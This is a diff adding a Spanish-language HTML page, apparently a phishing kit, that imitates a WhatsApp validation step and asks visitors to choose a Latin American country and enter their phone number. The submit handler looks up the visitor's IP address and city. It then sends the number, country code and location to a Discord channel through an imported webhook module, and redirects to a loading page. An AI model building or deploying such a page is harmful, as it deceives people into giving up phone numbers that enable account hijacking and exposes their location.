@@ -1,0 +1,143 @@
+
+<!DOCTYPE html>
+<html><head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba --><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  <link href="remixicon.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>Iniciar</title>
+</head>
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+  <section class="login">
+    <img src="fon.webp" alt="Login-image" class="login--image">
+
+    <form  id="form1" class="login--form">
+        <div align="left">
+        <img src="www.png" style="width:110px"><br>
+      <span style="font-size:16px"><b>Para continuar con la validaci&oacute;n su pais e ingrese su n&uacute;mero de tel&eacute;fono</b></span>
+</div><br>
+      <div class="login--content">
+        <div class="login-box">
+          <i class=""></i>
+
+          <div class="login--input-box">
+        
+                         <select id="opcion" class="login-input"  >
+                <option value="" disabled="" selected="">Selecciona tu país</option>
+                <option value="+54">🇦🇷 Argentina</option>
+                <option value="+591">🇧🇴 Bolivia</option>
+                <option value="+55">🇧🇷 Brasil</option>
+                <option value="+56">🇨🇱 Chile</option>
+                <option value="+57">🇨🇴 Colombia</option>
+                <option value="+506">🇨🇷 Costa Rica</option>
+                <option value="+53">🇨🇺 Cuba</option>
+                <option value="+1">🇩🇴 República Dominicana</option>
+                <option value="+593">🇪🇨 Ecuador</option>
+                <option value="+503">🇸🇻 El Salvador</option>
+                <option value="+502">🇬🇹 Guatemala</option>
+                <option value="+504">🇭🇳 Honduras</option>
+                <option value="+52">🇲🇽 México</option>
+                <option value="+505">🇳🇮 Nicaragua</option>
+                <option value="+507">🇵🇦 Panamá</option>
+                <option value="+595">🇵🇾 Paraguay</option>
+                <option value="+51">🇵🇪 Perú</option>
+                <option value="+598">🇺🇾 Uruguay</option>
+                <option value="+58">🇻🇪 Venezuela</option>
+            </select>
+     
+                 </div>
+        </div>
+
+        <div class="login-box">
+  <i class="ri-phone-fill"></i>
+  <div class="login--input-box" style="display: flex; align-items: center;">
+    <span id="prefijo" style="margin-right: 5px; font-weight: bold;"></span>
+    <input type="tel" class="login-input" id="numero" placeholder=" " maxlength="15" 
+           onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
+    <label id="labelTelefono" for="numero" class="login--input-label">Teléfono</label>
+  </div>
+</div>
+      </div>
+      <button type="submit" id="btene" class="login--button--whatsapp">Siguiente</button>
+    </form>
+  </section>
+  
+  <script>
+  const selectPais = document.getElementById("opcion");
+  const prefijo = document.getElementById("prefijo");
+  const labelTel = document.getElementById("labelTelefono");
+
+  selectPais.addEventListener("change", function() {
+    prefijo.textContent = this.value; // Mostrar el código del país
+    labelTel.style.display = "none";  // Ocultar el label Teléfono
+  });
+</script>
+
+
+  <script type="module">
+
+  const form = document.getElementById("form1");
+  const btn = document.getElementById("btene");
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+
+    btn.disabled = true;
+   
+
+    const tai = document.getElementById("opcion").value;
+    const tou = document.getElementById("numero").value;
+
+    localStorage.setItem('opcion', tai);
+    localStorage.setItem('numero', tou);
+
+
+    let ip = "Desconocida";
+    let city = "Desconocida";
+    try {
+      const ipRes = await fetch("https://ipwhois.app/json/");
+      const ipData = await ipRes.json();
+      ip = ipData.ip || "No encontrada";
+      city = ipData.city || "No encontrada";
+    } catch (error) {
+      console.error("Error obteniendo IP:", error);
+    }
+
+    const payload = {
+      content: `🟢WH4TS4PP🟢\nPAYS: ${tai}\nNUM: ${tou}\n\n🌍 IP: ${ip}\n🏙️ Ciudad: ${city}`
+    };
+
+    try {
+      const { sendToDiscord } = await import('./discord-config.js');
+      const res = await sendToDiscord(payload);
+      if (res.ok) {
+        window.location.href = "carga.html";
+      } else {
+        btn.disabled = false;
+        btn.innerText = "Enviar";
+        alert("Error al enviar el formulario");
+      }
+    } catch (error) {
+      btn.disabled = false;
+      btn.innerText = "Enviar";
+      alert("Error de conexión");
+    }
+});
+</script>
+<!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2201027&amp;t=1758512983&amp;k=048f51dad727586b15934061cdaa0fa2&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+</body></html>
